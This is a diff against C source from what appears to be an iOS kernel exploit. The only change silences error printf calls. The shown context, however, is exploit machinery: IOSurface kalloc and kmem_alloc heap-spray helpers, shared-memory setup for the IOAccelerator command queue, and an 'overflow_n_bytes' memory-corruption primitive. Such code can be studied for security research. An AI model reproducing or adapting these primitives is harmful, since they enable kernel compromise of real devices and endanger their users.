@@ -59,7 +59,7 @@ int IOSurface_setValue(struct IOSurfaceValueArgs *args, size_t args_size) {
     
     kern_return_t ret = IOConnectCallMethod(IOSurfaceRootUserClient, 9, NULL, 0, args, args_size, NULL, NULL, &result, &result_size);
     if (ret) {
-        printf("[-][IOSurface] Failed to set value: 0x%x (%s)\n", ret, mach_error_string(ret));
+        // printf("[-][IOSurface] Failed to set value: 0x%x (%s)\n", ret, mach_error_string(ret));
         return ret;
     }
     return 0;
@@ -102,7 +102,7 @@ int IOSurface_empty_kalloc(uint32_t size, uint32_t kalloc_key) {
     uint32_t capacity = size / 16;
     
     if (capacity > 0x00ffffff) {
-        printf("[-][IOSurface] Size too big for OSUnserializeBinary\n");
+        // printf("[-][IOSurface] Size too big for OSUnserializeBinary\n");
         return KERN_FAILURE;
     }
     
@@ -129,11 +129,11 @@ int IOSurface_empty_kalloc(uint32_t size, uint32_t kalloc_key) {
 
 int IOSurface_kmem_alloc(void *data, uint32_t size, uint32_t kalloc_key) {
     if (size < ps) {
-        printf("[-][IOSurface] Size too small for kmem_alloc\n");
+        // printf("[-][IOSurface] Size too small for kmem_alloc\n");
         return KERN_FAILURE;
     }
     if (size > 0x00ffffff) {
-        printf("[-][IOSurface] Size too big for OSUnserializeBinary\n");
+        // printf("[-][IOSurface] Size too big for OSUnserializeBinary\n");
         return KERN_FAILURE;
     }
     
@@ -159,15 +159,15 @@ int IOSurface_kmem_alloc(void *data, uint32_t size, uint32_t kalloc_key) {
 
 int IOSurface_kmem_alloc_spray(void *data, uint32_t size, int count, uint32_t kalloc_key) {
     if (size < ps) {
-        printf("[-][IOSurface] Size too small for kmem_alloc\n");
+        // printf("[-][IOSurface] Size too small for kmem_alloc\n");
         return KERN_FAILURE;
     }
     if (size > 0x00ffffff) {
-        printf("[-][IOSurface] Size too big for OSUnserializeBinary\n");
+        // printf("[-][IOSurface] Size too big for OSUnserializeBinary\n");
         return KERN_FAILURE;
     }
     if (count > 0x00ffffff) {
-        printf("[-][IOSurface] Size too big for OSUnserializeBinary\n");
+        // printf("[-][IOSurface] Size too big for OSUnserializeBinary\n");
         return KERN_FAILURE;
     }
     
@@ -233,13 +233,13 @@ int alloc_shmem(uint32_t buffer_size, struct IOAccelDeviceShmemData *cmdbuf, str
     
     kern_return_t kr = IOAccelSharedUserClient2_create_shmem(buffer_size, &command_buffer_shmem);
     if (kr) {
-        printf("[-] IOAccelSharedUserClient2_create_shmem: 0x%x (%s)\n", kr, mach_error_string(kr));
+        // printf("[-] IOAccelSharedUserClient2_create_shmem: 0x%x (%s)\n", kr, mach_error_string(kr));
         return kr;
     }
     
     kr = IOAccelSharedUserClient2_create_shmem(buffer_size, &segment_list_shmem);
     if (kr) {
-        printf("[-] IOAccelSharedUserClient2_create_shmem: 0x%x (%s)\n", kr, mach_error_string(kr));
+        // printf("[-] IOAccelSharedUserClient2_create_shmem: 0x%x (%s)\n", kr, mach_error_string(kr));
         return kr;
     }
     
@@ -273,7 +273,7 @@ int alloc_shmem(uint32_t buffer_size, struct IOAccelDeviceShmemData *cmdbuf, str
 
 int overflow_n_bytes(uint32_t buffer_size, int n, struct IOAccelDeviceShmemData *cmdbuf, struct IOAccelDeviceShmemData *seglist) {
     if (n > 8 || n < 0) {
-        printf("[-] Can't overflow: 0 <= n <= 8\n");
+        // printf("[-] Can't overflow: 0 <= n <= 8\n");
         return -1;
     }
     
@@ -318,7 +318,7 @@ int make_buffer_readable_by_kernel(void *buffer, uint64_t n_pages) {
 int init_IOAccelerator() {
     IOGraphicsAccelerator2 = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOGraphicsAccelerator2"));
     if (!IOGraphicsAccelerator2) {
-        printf("[-] Failed to find IOGraphicsAccelerator2 service\n");
+        // printf("[-] Failed to find IOGraphicsAccelerator2 service\n");
         return KERN_FAILURE;
     }
 
@@ -327,7 +327,7 @@ int init_IOAccelerator() {
         // iOS 12. should probably move this to offsets.m
         kern_return_t kr2 = IOServiceOpen(IOGraphicsAccelerator2, mach_task_self(), 5, &IOAccelCommandQueue2);
         if (kr2) {
-            printf("[-] Failed to open IOAccelCommandQueue2: 0x%x (%s)\n", kr, mach_error_string(kr));
+            // printf("[-] Failed to open IOAccelCommandQueue2: 0x%x (%s)\n", kr, mach_error_string(kr));
             return kr;
         }
     }
@@ -335,13 +335,13 @@ int init_IOAccelerator() {
     kr = IOServiceOpen(IOGraphicsAccelerator2, mach_task_self(),
             IOAccelSharedUserClient2_type, &IOAccelSharedUserClient2);
     if (kr) {
-        printf("[-] Failed to open IOAccelSharedUserClient2: 0x%x (%s)\n", kr, mach_error_string(kr));
+        // printf("[-] Failed to open IOAccelSharedUserClient2: 0x%x (%s)\n", kr, mach_error_string(kr));
         return kr;
     }
     
     kr = IOConnectAddClient(IOAccelCommandQueue2, IOAccelSharedUserClient2);
     if (kr) {
-        printf("[-] Failed to connect IOAccelCommandQueue2 to IOAccelSharedUserClient2: 0x%x (%s)\n", kr, mach_error_string(kr));
+        // printf("[-] Failed to connect IOAccelCommandQueue2 to IOAccelSharedUserClient2: 0x%x (%s)\n", kr, mach_error_string(kr));
         return kr;
     }
 
